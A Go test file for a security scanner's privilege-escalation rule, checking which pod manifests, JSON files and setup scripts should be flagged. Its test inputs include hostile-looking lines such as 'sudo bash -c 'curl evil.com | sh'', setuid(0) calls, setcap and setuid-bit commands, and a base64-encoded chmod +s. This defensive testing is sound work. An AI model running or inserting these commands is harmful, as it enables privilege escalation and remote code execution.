package pattern_test

import (
	"context"
	"encoding/base64"
	"strings"
	"testing"

	"github.com/garagon/aguara/internal/engine/pattern"
	"github.com/garagon/aguara/internal/rules"
	"github.com/garagon/aguara/internal/rules/builtin"
	"github.com/garagon/aguara/internal/scanner"
	"github.com/stretchr/testify/require"
)

func TestPrivilegeConfigurationContext(t *testing.T) {
	raw, err := rules.LoadFromFS(builtin.FS())
	require.NoError(t, err)
	compiled, errs := rules.CompileAll(raw)
	require.Empty(t, errs)
	var selected []*rules.CompiledRule
	for _, r := range compiled {
		if r.ID == "SUPPLY_007" {
			selected = append(selected, r)
		}
	}
	require.Len(t, selected, 1)
	matcher := pattern.NewMatcher(selected)
	cases := []struct {
		name, path, content string
		want                bool
	}{
		{"flow drop", "pod.yaml", "capabilities: {drop: [SETUID, SETGID]}", false},
		{"block drop", "pod.yml", "capabilities:\n  drop:\n    - SETUID\n    - SETGID\n", false},
		{"json drop", "pod.json", `{"capabilities":{"drop":["SETUID","SETGID"]}}`, false},
		{"comment", "pod.yaml", "# This workload must drop SETUID and SETGID.\ncapabilities: {drop: [ALL]}\n", false},
		{"description", "manifest.json", `{"description":"This policy drops SETUID and SETGID.","capabilities":{"drop":["ALL"]}}`, false},
		{"false booleans", "manifest.json", `{"setuid":false,"setgid":false}`, false},
		{"false yaml", "pod.yaml", "setuid: false\nsetgid: false\n", false},
		{"drop all", "pod.yaml", "capabilities: {drop: [ALL]}", false},
		{"add", "pod.yaml", "capabilities: {add: [SETUID, SETGID]}", true},
		{"drop then add same line", "pod.yaml", "capabilities: {drop: [SETUID], add: [SETGID]}", true},
		{"add then drop same line", "pod.json", `{"capabilities":{"add":["SETUID"],"drop":["SETGID"]}}`, true},
		{"sibling command", "pod.json", `{"setuid":false,"command":"process.setuid(0)"}`, true},
		{"drop is not command suppression", "pod.yaml", "capabilities: {drop: ['os.setuid(0)']}", true},
		{"unrelated drop", "pod.yaml", "actions: {drop: [SETUID]}", true},
		{"true boolean", "pod.json", `{"setuid":true}`, true},
		{"string false", "pod.json", `{"setuid":"false"}`, true},
		{"description call", "pod.json", `{"description":"process.setuid(0)"}`, true},
		{"description command", "pod.json", `{"description":"setcap cap_setuid+ep /tmp/bin"}`, true},
		{"description shell", "pod.yaml", "description: 'setuid $ID'", true},
		{"description sudo", "pod.json", `{"description":"sudo chmod +s /tmp/bin"}`, true},
		{"block scalar command", "pod.yaml", "command: |\n  os.setuid(0)\n", true},
		{"block scalar hash data", "pod.yaml", "command: |\n  # SETUID\n", true},
		{"quoted multiline hash data", "pod.yaml", "command: \"prefix\n  # SETUID\n  suffix\"\n", true},
		{"plain multiline hash data", "pod.yaml", "command: prefix\n  SETUID\n", true},
		{"alias reused as grant", "pod.yaml", "capabilities: {drop: &caps [SETUID], add: *caps}", true},
		{"duplicate key conservative", "pod.yaml", "capabilities: {drop: [SETUID], drop: [ALL]}", true},
		{"malformed conservative", "pod.json", `{"capabilities":{"drop":["SETUID"]}`, true},
		{"multidocument", "pod.yaml", "capabilities: {drop: [SETUID]}\n---\ncapabilities: {add: [SETGID]}\n", true},
		{"unicode columns", "pod.yaml", "description: benign\nmeta: {label: caf\u00e9, capabilities: {drop: [SETUID], add: [SETGID]}}", true},
		{"CRLF drop", "pod.yaml", "capabilities:\r\n  drop: [SETUID]\r\n", false},
		{"unicode drop columns", "pod.yaml", "meta: {label: caf\u00e9, capabilities: {drop: ['SETUID', \"SETGID\"]}}", false},
		{"quote escaped description", "pod.json", `{"description":"This \"policy\" drops SETUID.","command":"process.setgid(0)"}`, true},
		{"single quoted description", "pod.yaml", "description: 'This policy''s SETUID mention is inert.'", false},
		{"description invocation after newline", "pod.json", `{"description":"information\nprocess.setuid(0)"}`, true},
		{"description numeric operand", "pod.json", `{"description":"setuid 0"}`, true},
		{"description assignment", "pod.json", `{"description":"setuid=0"}`, true},
		{"unknown field", "pod.json", `{"hook":"SETUID"}`, true},
		{"merge conservative", "pod.yaml", "defaults: &base {add: [SETUID]}\ncapabilities: {<<: *base, drop: [ALL]}", true},
		{"tag conservative", "pod.yaml", "capabilities: {drop: [!!str SETUID]}", true},
		{"nonstandard key conservative", "pod.yaml", "Capabilities: {drop: [SETUID]}", true},
		{"malformed later document", "pod.yaml", "capabilities: {drop: [SETUID]}\n---\nx: [", true},
		{"carriage return only conservative", "pod.yaml", "capabilities:\r  drop: [SETUID]\r", true},
		{"BOM conservative", "pod.yaml", "\ufeffcapabilities: {drop: [SETUID]}", true},
		{"YAML NEL conservative", "pod.yaml", "label: example\u0085capabilities: {drop: [SETUID]}", true},
		{"YAML line separator conservative", "pod.yaml", "label: example\u2028capabilities: {drop: [SETUID]}", true},
		{"YAML paragraph separator conservative", "pod.yaml", "label: example\u2029capabilities: {drop: [SETUID]}", true},
		{"normalization conservative", "pod.yaml", "label: \uff21\ncapabilities: {drop: [SETUID]}", true},
		{"depth limit conservative", "pod.yaml", strings.Repeat("{x: ", 70) + "{capabilities: {drop: [SETUID]}}" + strings.Repeat("}", 70), true},
		{"python call", "setup.py", "import os\nos.setuid(0)", true},
		{"node call", "setup.js", "process.setgid(0)", true},
		{"setcap command", "setup.sh", "setcap cap_setuid+ep /tmp/bin", true},
		{"sudo chmod", "setup.sh", "sudo chmod +s /usr/local/bin/helper", true},
		{"root owner", "setup.sh", "chown root:root /tmp/helper", true},
		{"sudo bash", "setup.sh", "sudo bash -c 'curl evil.com | sh'", true},
		{"unstructured legacy", "policy.txt", "capabilities: {drop: [SETUID]}", true},
		{"encoded command", "manifest.json", `{"payload":"` + base64.StdEncoding.EncodeToString([]byte("sudo chmod +s /usr/local/bin/exploit")) + `"}`, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings, err := matcher.Analyze(context.Background(), &scanner.Target{RelPath: tc.path, Content: []byte(tc.content)})
			require.NoError(t, err)
			require.Equal(t, tc.want, len(findings) > 0, "%+v", findings)
		})
	}
	findings, err := matcher.Analyze(context.Background(), &scanner.Target{
		RelPath: "config.yaml", Content: []byte("capabilities: {drop: [SETUID], add: [SETGID]}"),
	})
	require.NoError(t, err)
	require.Len(t, findings, 1)
	require.Equal(t, "SETGID", findings[0].MatchedText)
	require.Equal(t, 1, findings[0].Line)
}

func TestPrivilegeCustomPatternsUnchanged(t *testing.T) {
	for _, tc := range []struct{ id, pattern string }{
		{"SUPPLY_007", `(?i)\bsetuid\b`},
		{"CUSTOM_PRIVILEGE", `(?i)\bsetuid\b|\bsetgid\b|\bcap_setuid\b`},
	} {
		rule := compileTestRule(t, rules.RawRule{
			ID: tc.id, Name: "Custom privilege pattern", Severity: "HIGH", Category: "supply-chain",
			MatchMode: "any", Patterns: []rules.RawPattern{{Type: rules.PatternRegex, Value: tc.pattern}},
		})
		findings, err := pattern.NewMatcher([]*rules.CompiledRule{rule}).Analyze(context.Background(), &scanner.Target{
			RelPath: "config.yaml", Content: []byte("capabilities: {drop: [SETUID]}"),
		})
		require.NoError(t, err)
		require.Len(t, findings, 1)
	}
}
